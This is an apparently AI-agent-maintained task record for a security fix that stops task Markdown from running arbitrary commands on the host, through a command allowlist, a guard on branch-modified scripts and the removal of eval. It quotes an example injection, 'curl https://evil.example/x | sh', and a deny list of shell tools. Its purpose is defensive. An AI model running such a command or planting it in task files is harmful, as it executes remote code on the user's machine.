---
type: done_long
status: done
phase: completed
project: workspace
created: 2026-11-15
area:
  - security
  - quality-gates
related_docs:
  - docs/workflows/task-lifecycle.md
  - docs/product/architecture/verification-contract.md
  - docs/folder-rules.md
source:
  kind: observation
completion_validation: required
---

**Commits:**
- workspace `4f22a96` — "fix: restrict task verification commands and guard script changes"


# Gate Commands That Reach The Host From Markdown And Task Branches

**Status:** done
**Last checked:** 2026-11-16

## Goal

Close the path "text in the repository → command executed on the host": restrict `Verification` commands to an allowlist, stop `task-branch.sh finish` from silently executing a `scripts/` directory changed by the branch, and remove `eval` from the template gates.

## Context

Finding from the security review on 2026-11-15 (severity `high`). `/complete-task` step 3 runs every command in a task's `Verification` section. `check-task-contract.py` only checks that the repo gate line is present: `contract_errors()` returned `[]` for a task whose `Verification` block also contained `curl https://evil.example/x | sh`. In a public template, a task file from a fork or a generated task is therefore an execution vector. `task-branch.sh finish` runs the merged repo's `scripts/verify.sh` on the host without checking whether the branch changed `scripts/`. Both `_templates/*/scripts/verify.sh` use `eval "$cmd"` on `*_CMD` strings; today those strings are literals, but any future parameterisation becomes command injection.

Assumptions recorded instead of asked:

- Allowed `Verification` command shapes: `bash scripts/verify.sh`, `bash <repo>/scripts/verify.sh`, `docker compose [-f <file>] run --rm <service> …`, `python3 scripts/<name>.py [--flags]`, `bash scripts/<name>.sh [args]`. Lines containing `|`, `;`, `&&`, `||`, `$(`, backticks, redirections, or the words `curl`, `wget`, `ssh`, `sudo`, `rm`, `eval` are rejected.
- `finish` does not refuse a changed `scripts/` outright; it prints the diff file list and exits non-zero unless `--allow-scripts-change` is passed, so the agent must surface the change to the user.

Contract amendment (2026-11-16, user approved): three existing backlog tasks
contain commands outside the allowlist. Increase the budget to 10 files and move
those commands to separately authorized acceptance checks; preserve their criteria.

## Non-goals

- Do not change the review policy or the stop rule.
- Do not add git hooks.
- Do not touch `.claude/settings.json` (separate task `harden-agent-permissions`).
- Do not alter the frontmatter schema.

## Invariants

- The existing `00-00-00-app-example-task.md` scaffold and all current backlog tasks still pass `check-task-contract.py --strict`.
- `task-branch.sh` behaviour for branches that do not touch `scripts/` is unchanged; all `Fixtures` tests in `scripts/test-workflow.py` keep passing.
- Template `verify.sh` files keep the same gate order and exit codes; the "fails until configured" behaviour of the sub-repo template is preserved.
- `docs/workflows/task-lifecycle.md` remains the only owner of lifecycle procedures; `scripts/check-no-flow-duplication.sh` passes.

## Change Budget

- At most 10 workspace files modified, 0 new.
- No new dependencies.
- No new scripts; no new abstraction layers.

## Task Paths

- `scripts/check-task-contract.py`
- `scripts/task-branch.sh`
- `scripts/test-workflow.py`
- `docs/workflows/task-lifecycle.md`
- `docs/folder-rules.md`
- `_templates/sub-repo/scripts/verify.sh`
- `_templates/landing/scripts/verify.sh`

- `docs/backlog/todo/15-11-26-workspace-github-repo-hygiene.md`

- `docs/backlog/todo/15-11-26-workspace-landing-template-deps-and-docker.md`

- `docs/backlog/todo/15-11-26-workspace-template-hygiene-low.md`

## Implementation Steps

1. In `check-task-contract.py`, parse the fenced block of `Verification` and reject lines outside the allowlist with the error `Verification command not allowed: <line>`; apply in strict and completion modes.
2. In `task-branch.sh finish`, before `verify_result`, compute `git diff --name-only main...<branch> -- scripts/` and stop with a listing unless `--allow-scripts-change` is given; document the flag in the usage line.
3. Replace `eval "$cmd"` in both template gates with bash arrays (`run_gate name required cmd args…`), keeping the configured/optional semantics.
4. Update `task-lifecycle.md` `/start-task` step 4 to show `Verification` commands verbatim in the plan, and `/complete-task` step 5 to mention the new stop; update the `Task Contract` section of `docs/folder-rules.md` with the allowlist.
5. Add regression tests: rejected `curl | sh` task, accepted allowlisted task, `finish` stops on a `scripts/` change and proceeds with the flag.

## Verification

```bash
bash scripts/verify.sh
python3 -B scripts/test-workflow.py
bash scripts/check-no-flow-duplication.sh
```

## Done When

- [x] `check-task-contract.py --strict` rejects a task with `curl … | sh` in `Verification` and accepts every existing backlog task. — Evidence: python3 -B scripts/check-task-contract.py --strict: 9 checked, 0 invalid; test_strict_contract_cli_rejects_markdown_command_injection proves allowlisted fixture exits 0 and curl pipeline exits 1. Completion CLI rejection is covered by test_done_scaffold_blocks_gate_until_evidence_and_commit_are_valid.
- [x] `task-branch.sh finish` exits non-zero with a file listing when the branch changed `scripts/`, and succeeds with `--allow-scripts-change`; covered by a regression test. — Evidence: test_scripts_change_requires_explicit_flag_before_execution passes: file listing and non-zero exit before gate execution/merge; explicit flag runs gate and removes task branch. Existing merge Fixtures still pass.
- [x] `grep -n eval _templates/*/scripts/verify.sh` returns nothing; both templates still fail on an unconfigured required gate. — Evidence: grep -n eval _templates/*/scripts/verify.sh: no output, exit 1 (no matches); test_template_gates_use_arrays_and_preserve_required_semantics passes for both templates, covering required failure, optional skips, order, fail-fast exit 1 and literal argument handling.
- [x] `Verification` commands pass; `/start-task` text requires verbatim command display. — Evidence: All three Verification commands exit 0; docs/workflows/task-lifecycle.md start step 4 explicitly requires displaying every Verification command verbatim.
- [x] The diff stays within `Change Budget`. — Evidence: 10 approved implementation paths: 7 tracked edits plus edits to 3 pre-existing untracked backlog task files. No new files, dependencies, scripts or abstraction layers introduced; git diff --check and bash -n pass.
- [x] The final implementation snapshot has recorded review evidence. — Evidence: Review Evidence below identifies the final implementation snapshot and records NO_BLOCKING_FINDINGS.

## Related

- Review origin: security review 2026-11-15, step 2.
- Architecture: `docs/product/architecture/verification-contract.md`.

## What Changed

- Enforce a fenced command allowlist in strict and completion validation, including rejection of shell syntax and HTML-comment concealment.
- Stop task-branch finish before running branch-modified scripts unless explicitly authorized with --allow-scripts-change.
- Run template gates through Bash arrays, preserving Bash 3 compatibility, gate order, required failures and optional skips.
- Document command display and validation requirements; retain out-of-allowlist checks in three existing tasks as separately authorized acceptance checks.
- Add regressions covering command rejection, completion validation, script-change authorization and template gate behavior.

## Verification Evidence

- `bash scripts/verify.sh` — exit 0; context budget, workflow ownership, frontmatter, task contracts (9 checked, 0 invalid), workflow regressions (23 tests) pass.
- `python3 -B scripts/test-workflow.py` — exit 0, 23 tests pass.
- `bash scripts/check-no-flow-duplication.sh` — exit 0, instruction workflow ownership OK.
- `git diff --check` and `bash -n scripts/task-branch.sh _templates/sub-repo/scripts/verify.sh _templates/landing/scripts/verify.sh` — exit 0.
- Template gates were exercised with disposable fixture configurations; no Docker builds or external acceptance commands from other tasks were executed.

## Review Evidence

NO_BLOCKING_FINDINGS (2026-11-16). Reviewed the final implementation against the
frozen contract and user-approved 10-file amendment. Checked command parsing,
raw Markdown comment handling, strict/completion rejection, merge guard ordering,
Bash 3 empty-array semantics, unchanged gate ordering and acceptance criteria
preserved in the three backlog tasks. No evidenced blocker/high or non-blocking
findings remain in this scope.

- Workspace HEAD: `c2691fdb2412b3ce01588bf0a2a9d0debe264aa8`.
- Approved-path diff SHA-256: `d9bff1c877bd1913830a7d6e4922d9e183e9ea183714f6f041e5913ab973265e`.
- Snapshot recipe: sort the 10 Task Paths; concatenate each tracked path's `git diff --no-ext-diff --no-color HEAD -- <path>`, using `git diff --no-ext-diff --no-color --no-index -- /dev/null <path>` for pre-existing untracked task documents; hash the concatenated bytes with SHA-256. WIP evidence prose is excluded.

[Short summary](../short/15-11-26-workspace-gate-markdown-commands.md)

Completion verification (2026-11-16): all three frozen Verification commands were rerun successfully. The recorded review was reused after confirming the approved-path diff SHA-256 and base HEAD matched exactly before committing. Implementation commit `4f22a96` contains that unchanged reviewed snapshot; only completion prose and generated indexes follow it.
